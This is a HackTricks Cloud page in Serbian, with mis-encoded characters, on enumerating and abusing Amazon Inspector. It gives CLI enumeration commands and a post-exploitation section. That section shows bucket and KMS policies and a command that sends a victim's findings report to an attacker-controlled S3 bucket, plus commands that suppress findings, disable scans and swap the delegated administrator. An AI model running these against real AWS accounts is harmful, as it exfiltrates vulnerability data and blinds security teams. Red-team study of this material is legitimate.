# AWS - Inspector Enum

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Inspector

Amazon Inspector je napredna, automatizovana usluga upravljanja ranjivostima dizajnirana da unapredi sigurnost vaÅ¡eg AWS okruÅ¾enja. Ova usluga kontinuirano skenira Amazon EC2 instance, kontejnerske slike u Amazon ECR-u, Amazon ECS i AWS Lambda funkcije radi otkrivanja ranjivosti i neÅ¾eljenog izlaganja mreÅ¾e. KoriÅ¡Ä‡enjem robustne baze podataka o ranjivostima, Amazon Inspector pruÅ¾a detaljne nalaze, ukljuÄujuÄ‡i nivoe ozbiljnosti i preporuke za otklanjanje, pomaÅ¾uÄ‡i organizacijama da proaktivno identifikuju i reÅ¡e sigurnosne rizike. Ovaj sveobuhvatan pristup osigurava ojaÄanu sigurnosnu postavku Å¡irom razliÄitih AWS usluga, pomaÅ¾uÄ‡i u usklaÄ‘enosti i upravljanju rizicima.

## KljuÄni elementi

### Nalazi

Nalazi u Amazon Inspector-u su detaljni izveÅ¡taji o ranjivostima i izloÅ¾enostima otkrivenim tokom skeniranja EC2 instanci, ECR repozitorijuma ili Lambda funkcija. Na osnovu svog stanja, nalazi se kategorizuju kao:

- **Aktivni**: Nalaz nije otklonjen.
- **Zatvoreni**: Nalaz je otklonjen.
- **Potisnuti**: Nalaz je oznaÄen ovim stanjem zbog jednog ili viÅ¡e **pravila potiskivanja**.

Nalazi se takoÄ‘e kategorizuju u sledeÄ‡e tri vrste:

- **Paket**: Ovi nalazi se odnose na ranjivosti u softverskim paketima instaliranim na vaÅ¡im resursima. Primeri ukljuÄuju zastarele biblioteke ili zavisnosti sa poznatim sigurnosnim problemima.
- **Kod**: Ova kategorija ukljuÄuje ranjivosti pronaÄ‘ene u kodu aplikacija koje se izvrÅ¡avaju na vaÅ¡im AWS resursima. UobiÄajeni problemi su greÅ¡ke u kodiranju ili nesigurne prakse koje bi mogle dovesti do sigurnosnih propusta.
- **MreÅ¾a**: Nalazi u mreÅ¾i identifikuju potencijalna izlaganja u konfiguracijama mreÅ¾e koja bi mogla biti iskoriÅ¡Ä‡ena od strane napadaÄa. To ukljuÄuje otvorene portove, nesigurne mreÅ¾ne protokole i loÅ¡e konfigurisane sigurnosne grupe.

### Filteri i pravila potiskivanja

Filteri i pravila potiskivanja u Amazon Inspector-u pomaÅ¾u u upravljanju i prioritetizaciji nalaza. Filteri vam omoguÄ‡avaju da precizirate nalaze na osnovu odreÄ‘enih kriterijuma, kao Å¡to su ozbiljnost ili tip resursa. Pravila potiskivanja vam omoguÄ‡avaju da potisnete odreÄ‘ene nalaze koji se smatraju niskim rizikom, veÄ‡ su otklonjeni ili iz bilo kog drugog vaÅ¾nog razloga, spreÄavajuÄ‡i ih da preopterete vaÅ¡e sigurnosne izveÅ¡taje i omoguÄ‡avajuÄ‡i vam da se fokusirate na vaÅ¾nije probleme.

### Softverski raÄun materijala (SBOM)

Softverski raÄun materijala (SBOM) u Amazon Inspector-u je izvozna ugnjeÅ¾dena inventarna lista koja detaljno opisuje sve komponente unutar softverskog paketa, ukljuÄujuÄ‡i biblioteke i zavisnosti. SBOM-ovi pomaÅ¾u u pruÅ¾anju transparentnosti u lanac snabdevanja softverom, omoguÄ‡avajuÄ‡i bolje upravljanje ranjivostima i usklaÄ‘enost. Oni su kljuÄni za identifikaciju i ublaÅ¾avanje rizika povezanih sa otvorenim kodom i softverskim komponentama treÄ‡ih strana.

## KljuÄne funkcije

### Izvoz nalaza

Amazon Inspector nudi moguÄ‡nost izvoza nalaza u Amazon S3 kofere, Amazon EventBridge i AWS Security Hub, Å¡to vam omoguÄ‡ava generisanje detaljnih izveÅ¡taja o identifikovanim ranjivostima i izloÅ¾enostima radi dalje analize ili deljenja u odreÄ‘enom datumu i vremenu. Ova funkcija podrÅ¾ava razliÄite formate izlaza kao Å¡to su CSV i JSON, Äime se olakÅ¡ava integracija sa drugim alatima i sistemima. Funkcionalnost izvoza omoguÄ‡ava prilagoÄ‘avanje podataka ukljuÄenih u izveÅ¡taje, omoguÄ‡avajuÄ‡i vam da filtrirate nalaze na osnovu specifiÄnih kriterijuma poput ozbiljnosti, tipa resursa ili vremenskog opsega i podrazumevano ukljuÄivanje svih vaÅ¡ih nalaza u trenutnom AWS regionu sa statusom Aktivni.

Prilikom izvoza nalaza, neophodan je KMS kljuÄ za Å¡ifrovanje podataka tokom izvoza. KMS kljuÄevi osiguravaju da izvezeni nalazi budu zaÅ¡tiÄ‡eni od neovlaÅ¡Ä‡enog pristupa, pruÅ¾ajuÄ‡i dodatni sloj sigurnosti za osetljive informacije o ranjivostima.

### Skeniranje Amazon EC2 instanci

Amazon Inspector nudi snaÅ¾ne moguÄ‡nosti skeniranja za Amazon EC2 instance radi otkrivanja ranjivosti i sigurnosnih problema. Inspector uporeÄ‘uje izvuÄene metapodatke sa EC2 instance sa pravilima iz sigurnosnih saveta kako bi proizveo ranjivosti paketa i probleme dostupnosti mreÅ¾e. Ovi skenovi se mogu izvrÅ¡iti putem **agent-based** ili **agentless** metoda, u zavisnosti od konfiguracije postavki **reÅ¾ima skeniranja** vaÅ¡eg naloga.

- **Agent-Based**: Koristi AWS Systems Manager (SSM) agent za obavljanje detaljnih skenova. Ovaj metod omoguÄ‡ava sveobuhvatno prikupljanje podataka i analizu direktno sa instance.
- **Agentless**: PruÅ¾a lagano alternativno reÅ¡enje koje ne zahteva instaliranje agenta na instanci, stvarajuÄ‡i EBS snimak svake zapremine EC2 instance, traÅ¾eÄ‡i ranjivosti, a zatim je briÅ¡uÄ‡i; koristeÄ‡i postojeÄ‡u AWS infrastrukturu za skeniranje.

ReÅ¾im skeniranja odreÄ‘uje koji metod Ä‡e se koristiti za izvoÄ‘enje EC2 skenova:

- **Agent-Based**: UkljuÄuje instaliranje SSM agenta na EC2 instancama za dubinsku inspekciju.
- **Hibridno skeniranje**: Kombinuje oba metoda, agent-based i agentless, kako bi se maksimizirala pokrivenost i minimizirao uticaj na performanse. Na EC2 instancama gde je SSM agent instaliran, Inspector Ä‡e izvrÅ¡iti skeniranje na bazi agenta, a na onima gde nema SSM agenta, izvrÅ¡iÄ‡e se skeniranje bez agenta.

JoÅ¡ jedna vaÅ¾na funkcija je **dubinska inspekcija** za EC2 Linux instance. Ova funkcija nudi temeljnu analizu softvera i konfiguracije EC2 Linux instanci, pruÅ¾ajuÄ‡i detaljne procene ranjivosti, ukljuÄujuÄ‡i ranjivosti operativnog sistema, ranjivosti aplikacija i loÅ¡e konfiguracije, osiguravajuÄ‡i sveobuhvatnu sigurnosnu procenu. Ovo se postiÅ¾e inspekcijom **prilagoÄ‘enih putanja** i svih njenih poddirektorijuma. Podrazumevano, Amazon Inspector Ä‡e skenirati sledeÄ‡e, ali svaki Älan raÄuna moÅ¾e definisati do 5 dodatnih prilagoÄ‘enih putanja, a svaki delegirani administrator do 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Skeniranje kontejnerskih slika Amazon ECR-a

Amazon Inspector pruÅ¾a snaÅ¾ne moguÄ‡nosti skeniranja za kontejnerske slike Amazon Elastic Container Registry (ECR), osiguravajuÄ‡i da se ranjivosti paketa otkriju i efikasno upravljaju.

- **Osnovno skeniranje**: Ovo je brzo i lagano skeniranje koje identifikuje poznate ranjivosti OS paketa u kontejnerskim slikama koristeÄ‡i standardni set pravila iz Clair projekta otvorenog koda. Sa ovom konfiguracijom skeniranja, vaÅ¡e repozitorijume Ä‡e biti skenirane prilikom slanja ili izvrÅ¡avanja ruÄnih skenova.
- **UnapreÄ‘eno skeniranje**: Ova opcija dodaje funkciju kontinuiranog skeniranja pored skeniranja prilikom slanja. UnapreÄ‘eno skeniranje dublje ulazi u slojeve svake kontejnerske slike kako bi identifikovalo ranjivosti u OS paketima i paketima programskih jezika sa veÄ‡om taÄnoÅ¡Ä‡u. Analizira kako osnovnu sliku, tako i sve dodatne slojeve, pruÅ¾ajuÄ‡i sveobuhvatan pregled potencijalnih sigurnosnih problema.

### Skeniranje Lambda funkcija Amazon-a

Amazon Inspector ukljuÄuje sveobuhvatne moguÄ‡nosti skeniranja za AWS Lambda funkcije i njene slojeve, osiguravajuÄ‡i sigurnost i integritet serverless aplikacija. Inspector nudi dva tipa skeniranja za Lambda funkcije:

- **Standardno skeniranje Lambda funkcija**: Ova podrazumevana funkcija identifikuje softverske ranjivosti u zavisnostima paketa aplikacije dodatih vaÅ¡oj Lambda funkciji i slojevima. Na primer, ako vaÅ¡a funkcija koristi verziju biblioteke kao Å¡to je python-jwt sa poznatom ranjivoÅ¡Ä‡u, generiÅ¡e nalaz.
- **Skeniranje koda Lambda funkcija**: Analizira prilagoÄ‘eni kod aplikacije radi otkrivanja sigurnosnih problema, identifikujuÄ‡i ranjivosti poput greÅ¡aka u ubacivanju, curenja podataka, slabe kriptografije i nedostatka Å¡ifrovanja. Snima iseÄke koda koji istiÄu otkrivene ranjivosti, kao Å¡to su tvrdo kodirane akreditacije. Nalazi ukljuÄuju detaljne preporuke za otklanjanje i iseÄke koda za popravku problema.
### **Skeniranja Centra za internet bezbednost (CIS)**

Amazon Inspector ukljuÄuje CIS skeniranja kako bi uporedio operativne sisteme instanci Amazon EC2 sa preporukama najbolje prakse Centra za internet bezbednost (CIS). Ova skeniranja osiguravaju da konfiguracije odgovaraju osnovnim bezbednosnim osnovama standarda industrije.

- **Konfiguracija**: CIS skeniranja procenjuju da li konfiguracije sistema ispunjavaju odreÄ‘ene preporuke CIS Benchmark-a, pri Äemu je svaka provera povezana sa CIS ID-jem i naslovom provere.
- **IzvrÅ¡enje**: Skeniranja se vrÅ¡e ili planiraju na osnovu oznaka instanci i definisanih rasporeda.
- **Rezultati**: Rezultati nakon skeniranja pokazuju koje provere su proÅ¡le, preskoÄene ili nisu uspele, pruÅ¾ajuÄ‡i uvid u bezbednosni poloÅ¾aj svake instance.

## Enumeracija
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Post Eksploatacija

{% hint style="success" %}
Sa perspektive napadaÄa, ovaj servis moÅ¾e pomoÄ‡i napadaÄu da pronaÄ‘e ranjivosti i mreÅ¾ne ekspozicije koje bi mu mogle pomoÄ‡i da kompromituje druge instance/kontejnere.

MeÄ‘utim, napadaÄ bi takoÄ‘e mogao biti zainteresovan za ometanje ovog servisa kako Å¾rtva ne bi mogla videti ranjivosti (sve ili odreÄ‘ene).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

NapadaÄ bi mogao generisati detaljne izveÅ¡taje o ranjivostima ili softverskim listama materijala (SBOMs) i eksfiltrirati ih iz vaÅ¡eg AWS okruÅ¾enja. Ove informacije bi mogle biti iskoriÅ¡Ä‡ene za identifikaciju specifiÄnih slabosti, zastarelog softvera ili nesigurnih zavisnosti, omoguÄ‡avajuÄ‡i ciljane napade.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
### Primer

SledeÄ‡i primer prikazuje kako eksfiltrirati sve aktivne nalaze iz Amazon Inspector-a do kontrolisanog Amazon S3 Bucket-a napadaÄa sa kontrolisanim Amazon KMS kljuÄem:

1. **Kreirajte Amazon S3 Bucket** i priloÅ¾ite mu politiku kako bi bio pristupaÄan iz Amazon Inspector-a Å¾rtve:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Kreirajte Amazon KMS kljuÄ** i priloÅ¾ite mu pravilo kako bi bio upotrebljiv od strane Å¾rtvinog Amazon Inspektora:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. IzvrÅ¡ite komandu za **kreiranje izveÅ¡taja o nalazima** i eksfiltraciju istog:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potencijalni uticaj**: Generisanje i eksfiltracija detaljnih izveÅ¡taja o ranjivostima i softveru, sticanje uvida u specifiÄne ranjivosti i sigurnosne slabosti.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

NapadaÄ bi mogao da otkaÅ¾e generisanje odreÄ‘enog izveÅ¡taja o nalazima ili SBOM izveÅ¡taja, spreÄavajuÄ‡i sigurnosne timove da na vreme dobiju informacije o ranjivostima i softverskim listama materijala (SBOMs), odlaÅ¾uÄ‡i otkrivanje i otklanjanje sigurnosnih problema.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potencijalni uticaj**: PoremecÌaj nadzora nad bezbednoÅ¡cÌu i spreÄavanje pravovremene detekcije i otklanjanja bezbednosnih problema.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

NapadaÄ sa ovim dozvolama mogao bi manipulisati pravilima filtriranja koja odreÄ‘uju koje ranjivosti i bezbednosni problemi se prijavljuju ili potiskuju (ako je **akcija** postavljena na SUPPRESS, biÄ‡e kreirano pravilo potiskivanja). Ovo bi moglo sakriti kritiÄne ranjivosti od administratora bezbednosti, olakÅ¡avajucÌi iskoriÅ¡Ä‡avanje ovih slabosti bez otkrivanja. Menjanjem ili uklanjanjem vaÅ¾nih filtera, napadaÄ takoÄ‘e moÅ¾e stvarati buku poplavljivanjem sistema nevaÅ¾nim nalazima, ometajucÌi efikasni nadzor i odgovor na bezbednosne pretnje.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potencijalni uticaj**: Prikrivanje ili suzbijanje kritiÄnih ranjivosti, ili poplava sistema nevaÅ¾nim nalazima.

### `inspector2:OnemoguÄ‡iDelegiranNalogAdministratora`, (`inspector2:OmoguÄ‡iDelegiranNalogAdministratora` & `organizations:SpisakDelegiranihAdministratora` & `organizations:OmoguÄ‡iPristupAWSServisu` & `iam:KreirajUloguPovezanuSaServisom`)

NapadaÄ bi mogao znaÄajno poremetiti strukturu upravljanja bezbednoÅ¡Ä‡u.

- OnemoguÄ‡avanjem delegiranog administratorskog naloga, napadaÄ bi mogao spreÄiti tim za bezbednost da pristupi i upravlja postavkama i izveÅ¡tajima Amazon Inspector-a.
- OmoguÄ‡avanjem neovlaÅ¡Ä‡enog administratorskog naloga, napadaÄu bi se omoguÄ‡ilo upravljanje bezbednosnim konfiguracijama, potencijalno onemoguÄ‡avanje skeniranja ili menjanje postavki kako bi se sakrile zlonamerne aktivnosti.

{% hint style="upozorenje" %}

Potrebno je da neovlaÅ¡Ä‡eni nalog bude u istoj Organizaciji kao Å¾rtva kako bi postao delegirani administrator.

Da bi neovlaÅ¡Ä‡eni nalog postao delegirani administrator, takoÄ‘e je potrebno da nakon Å¡to je legitimni delegirani administrator onemoguÄ‡en, a pre nego Å¡to se neovlaÅ¡Ä‡eni nalog omoguÄ‡i kao delegirani administrator, legitimni administrator mora biti odjavljen kao delegirani administrator iz organizacije. Ovo se moÅ¾e uraditi sledeÄ‡om komandom (**potrebna dozvola `organizations:DeregisterDelegatedAdministrator`**): **`aws organizations deregister-delegated-administrator --account-id <id-legitimnog-naloga> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potencijalni uticaj**: PoremecÌaj upravljanja bezbednoÅ¡cÌu.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

NapadaÄ bi mogao manipulisati udruÅ¾ivanjem Älanskih naloga unutar organizacije Amazon Inspector. UdruÅ¾ivanjem neovlaÅ¡Ä‡enih naloga ili razdvajanjem legitimnih, napadaÄ bi mogao kontrolisati koji se nalozi ukljuÄuju u bezbednosne skenove i izveÅ¡tavanje. To bi moglo rezultirati time da se kritiÄni nalozi iskljuÄe iz bezbednosnog nadgledanja, omogucÌavajucÌi napadaÄu da iskoristi ranjivosti u tim nalozima bez otkrivanja.

{% hint style="warning" %}

Ova radnja zahteva da je izvrÅ¡i delegirani administrator.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potencijalni uticaj**: IskljuÄenje kljuÄnih naloga iz sigurnosnih skeniranja, omoguÄ‡avajuÄ‡i neotkrivenu eksploataciju ranjivosti.

### `inspector2:OnemoguÄ‡i`, (`inspector2:OmoguÄ‡i` & `iam:KreirajServiceLinkedUlogu`)

NapadaÄ sa dozvolom `inspector2:OnemoguÄ‡i` bio bi u moguÄ‡nosti da onemoguÄ‡i sigurnosna skeniranja na odreÄ‘enim tipovima resursa (EC2, ECR, Lambda, Lambda kod) preko odreÄ‘enih naloga, ostavljajuÄ‡i delove AWS okruÅ¾enja nenadgledanim i ranjivim na napade. Pored toga, posedovanjem dozvola **`inspector2:OmoguÄ‡i`** & **`iam:KreirajServiceLinkedUlogu`**, napadaÄ bi zatim mogao ponovo omoguÄ‡iti skeniranja selektivno kako bi izbegao otkrivanje sumnjivih konfiguracija.

{% hint style="warning" %}
Ova akcija zahteva da je izvrÅ¡i delegirani administrator.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potencijalni uticaj**: Stvaranje slepih taÄaka u bezbednosnom nadgledanju.

### `inspector2:UpdateOrganizationConfiguration`

NapadaÄ sa ovlaÅ¡Ä‡enjem bi mogao da aÅ¾urira konfiguracije za vaÅ¡u Amazon Inspector organizaciju, utiÄuÄ‡i na podrazumevane funkcije skeniranja omoguÄ‡ene za nove Älanske naloge.

{% hint style="warning" %}

Ovu radnju mora izvrÅ¡iti delegirani administrator.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potencijalni uticaj**: Menjanje politika i konfiguracija bezbednosnog skeniranja za organizaciju.

### `inspector2:TagResource`, `inspector2:UntagResource`

NapadaÄ bi mogao da manipuliÅ¡e oznakama na AWS Inspector resursima, koje su kljuÄne za organizovanje, praÄ‡enje i automatizaciju bezbednosnih procena. Menjanjem ili uklanjanjem oznaka, napadaÄ bi potencijalno mogao da sakrije ranjivosti od bezbednosnih skeniranja, poremeti izveÅ¡tavanje o usklaÄ‘enosti i ometa automatizovane procese remedijacije, Å¡to moÅ¾e dovesti do nekontrolisanih bezbednosnih problema i ugroÅ¾ene celovitosti sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potencijalni uticaj**: Skrivanje ranjivosti, poremeÄ‡aj izveÅ¡tavanja o usklaÄ‘enosti, poremeÄ‡aj automatizacije bezbednosti i poremeÄ‡aj alokacije troÅ¡kova.

# Reference
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
